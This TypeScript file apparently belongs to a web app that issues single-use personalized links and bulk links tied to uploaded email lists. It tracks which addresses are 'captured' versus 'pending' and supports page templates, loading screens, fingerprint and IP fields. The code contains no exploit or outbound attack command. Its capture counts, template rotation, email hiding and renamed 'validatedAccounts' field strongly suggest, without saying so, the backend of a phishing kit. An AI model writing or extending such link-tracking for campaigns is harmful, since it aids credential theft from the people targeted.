/**
 * Link Management System
 * Handles Type A (personalized) and Type B (generic) links
 * Uses persistent file-based database (linkDatabase.ts)
 */

import {
  saveLink,
  getLink,
  markLinkUsed,
  updateGenericLinkStats,
  saveEmailIdMapping as dbSaveEmailIdMapping,
  getEmailFromId as dbGetEmailFromId,
  isEmailCaptured,
  type Link,
} from './linkDatabase'
import { createToken } from './tokens'

// ===== TYPE A: PERSONALIZED LINKS =====

/**
 * Create a personalized link (Type A)
 * One email = One link, single-use, email hidden from URL
 */
export async function createPersonalizedLink(
  email: string,
  documentId?: string,
  expirationHours: number = 168,  // Changed from 24 (1 day) to 168 (7 days)
  templateId?: string,
  templateMode?: 'auto' | 'manual' | 'rotate',
  loadingScreen?: string,
  loadingDuration?: number
): Promise<{
  url: string
  id: string
  token: string
  expiresAt: number
  sessionIdentifier: string
  linkToken?: string  // Legacy alias
}> {
  
  const id = `user_${Date.now()}_${Math.random().toString(36).substring(7)}`
  const docId = documentId || `doc_${id}`
  const expirationMinutes = expirationHours * 60
  const token = createToken(email, docId, expirationMinutes)
  const expiresAt = Date.now() + (expirationHours * 60 * 60 * 1000)


  // Save link to database
  await saveLink({
    id: `link_${id}`,
    type: 'personalized',
    sessionIdentifier: token,
    linkToken: token, // Legacy alias for backward compatibility
    name: `Personal_${email.split('@')[0]}`,
    email: email.toLowerCase(),
    allowedEmails: null,
    validatedAccounts: null,
    capturedEmails: null, // Legacy alias
    pendingEmails: null,
    totalEmails: null,
    capturedCount: null,
    pendingCount: null,
    createdAt: Date.now(),
    expiresAt,
    used: false,
    usedAt: null,
    fingerprint: null,
    ip: null,
    status: 'active',
    templateId: templateId || undefined,
    templateMode: templateMode || undefined,
    loadingScreen: loadingScreen || undefined,
    loadingDuration: loadingDuration || undefined,
  })

  // Save email-ID mapping
  await dbSaveEmailIdMapping(id, email, `link_${id}`)
  

  const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'http://localhost:3000'
  const url = `/?token=${token}&id=${id}`
  
  
  const fullUrl = `${baseUrl}${url}`

  return {
    url: `/?token=${token}&id=${id}`,
    id,
    token: token,
    sessionIdentifier: token,
    linkToken: token, // Legacy alias for compatibility
    expiresAt
  }
}

/**
 * Get email from ID (Type A links)
 * Uses database instead of in-memory map
 */
export async function getEmailFromId(id: string): Promise<string | null> {
  return await dbGetEmailFromId(id)
}

/**
 * Save email-ID mapping (Type A links)
 * Uses database instead of in-memory map
 */
export async function saveEmailIdMapping(id: string, email: string): Promise<void> {
  // Get link ID from token if available, otherwise use id as linkId
  await dbSaveEmailIdMapping(id, email, `link_${id}`)
}

// ===== TYPE B: GENERIC LINKS WITH EMAIL LIST =====

/**
 * Create a generic link (Type B)
 * One link for multiple emails from uploaded list
 */
export async function createGenericLink(
  name: string,
  allowedEmails: string[],
  expirationDays: number = 365,  // Changed from 7 days to 365 (1 year)
  templateId?: string
): Promise<{
  url: string
  token: string
  totalEmails: number
  expiresAt: number
}> {
  const token = `${Date.now()}_${Math.random().toString(36).substring(7)}`
  const expiresAt = Date.now() + (expirationDays * 24 * 60 * 60 * 1000)

  // Normalize emails (lowercase, deduplicate)
  const normalizedEmails = Array.from(new Set(allowedEmails.map(e => e.toLowerCase())))

  // Save link to database
  await saveLink({
    id: `link_${token}`,
    type: 'generic',
    sessionIdentifier: token,
    linkToken: token, // Legacy alias for backward compatibility
    name,
    email: null,
    allowedEmails: normalizedEmails,
    validatedAccounts: [],
    capturedEmails: [], // Legacy alias
    pendingEmails: [...normalizedEmails],
    totalEmails: normalizedEmails.length,
    capturedCount: 0,
    pendingCount: normalizedEmails.length,
    createdAt: Date.now(),
    expiresAt,
    used: false,
    usedAt: null,
    fingerprint: null,
    ip: null,
    status: 'active',
    templateId: templateId || undefined,
  })

  return {
    url: `/?token=${token}`,
    token,
    totalEmails: normalizedEmails.length,
    expiresAt
  }
}

/**
 * Get generic link configuration
 * Uses database instead of in-memory map
 */
export async function getGenericLinkConfig(token: string): Promise<Link | null> {
  const link = await getLink(token)
  if (link && link.type === 'generic') {
    return link
  }
  return null
}

/**
 * Save generic link configuration
 * Uses database instead of in-memory map
 */
export async function saveGenericLinkConfig(token: string, config: {
  expiresAt: number
  maxUses?: number | null
  singleUse?: boolean
  usedCount?: number
  usedEmails?: string[]
  createdAt?: number
}): Promise<void> {
  const existingLink = await getLink(token)
  
  if (existingLink && existingLink.type === 'generic') {
    // Update existing link
    existingLink.expiresAt = config.expiresAt
    if (config.createdAt) {
      existingLink.createdAt = config.createdAt
    }
    // Update validated accounts if provided (formerly: capturedEmails)
    if (config.usedEmails) {
      existingLink.validatedAccounts = config.usedEmails
      existingLink.capturedEmails = config.usedEmails // Legacy alias
      existingLink.capturedCount = config.usedEmails.length
      if (existingLink.pendingEmails && existingLink.allowedEmails) {
        existingLink.pendingEmails = existingLink.allowedEmails.filter(
          e => !config.usedEmails!.includes(e)
        )
        existingLink.pendingCount = existingLink.pendingEmails.length
      }
    }
    await saveLink(existingLink)
  } else {
    // Create new generic link (basic config)
    await saveLink({
      id: `link_${token}`,
      type: 'generic',
      sessionIdentifier: token,
      linkToken: token, // Legacy alias for backward compatibility
      name: null,
      email: null,
      allowedEmails: [],
      validatedAccounts: config.usedEmails || [],
      capturedEmails: config.usedEmails || [], // Legacy alias
      pendingEmails: [],
      totalEmails: 0,
      capturedCount: config.usedCount || 0,
      pendingCount: 0,
      createdAt: config.createdAt || Date.now(),
      expiresAt: config.expiresAt,
      used: false,
      usedAt: null,
      fingerprint: null,
      ip: null,
      status: 'active'
    })
  }
}

/**
 * Increment link usage (Type B)
 * Updates database stats
 */
export async function incrementLinkUsage(token: string, email: string): Promise<void> {
  await updateGenericLinkStats(token, email)
}

/**
 * Check if link was already used by email (Type B)
 * Uses database instead of in-memory map
 */
export async function checkLinkUsage(token: string, email: string): Promise<boolean> {
  return await isEmailCaptured(email, token)
}

// ===== LINK VALIDATION =====

/**
 * Check if link can be used
 * Validates expiration, status, and email authorization
 */
export async function canUseLink(
  sessionIdentifier: string,
  email?: string
): Promise<{
  canUse: boolean
  reason?: string
  link?: Link
}> {
  const link = await getLink(sessionIdentifier)

  if (!link) {
    return { canUse: false, reason: 'link_not_found' }
  }

  if (link.status !== 'active') {
    return { canUse: false, reason: 'link_inactive' }
  }

  // Check expiration (but can be bypassed by master toggle)
  if (link.expiresAt < Date.now()) {
    // Check if master toggle is enabled
    try {
      const { getSettings } = await import('./adminSettings')
      const settings = await getSettings()
      if (settings.linkManagement?.allowAllLinks) {
        // Master toggle is ON - allow expired links
        console.log('[LINK VALIDATION] ⚠️ Link expired but allowAllLinks is ON - allowing access')
        // Fall through to allow usage
      } else {
        // Master toggle is OFF - reject expired link
        return { canUse: false, reason: 'link_expired' }
      }
    } catch (error) {
      console.error('[LINK VALIDATION] Error checking master toggle:', error)
      // If error, use default (don't allow expired links)
      return { canUse: false, reason: 'link_expired' }
    }
  }

  // Type A: Check if already used
  if (link.type === 'personalized') {
    if (link.used) {
      return { canUse: false, reason: 'link_already_used' }
    }
  }

  // Type B: Check email authorization
  if (link.type === 'generic' && email) {
    const normalizedEmail = email.toLowerCase()

    // Check if email is in allowed list
    if (!link.allowedEmails?.includes(normalizedEmail)) {
      return { canUse: false, reason: 'email_not_authorized' }
    }

    // Check if email already captured
    if (await isEmailCaptured(normalizedEmail, sessionIdentifier)) {
      return { canUse: false, reason: 'email_already_captured' }
    }
  }

  return { canUse: true, link }
}

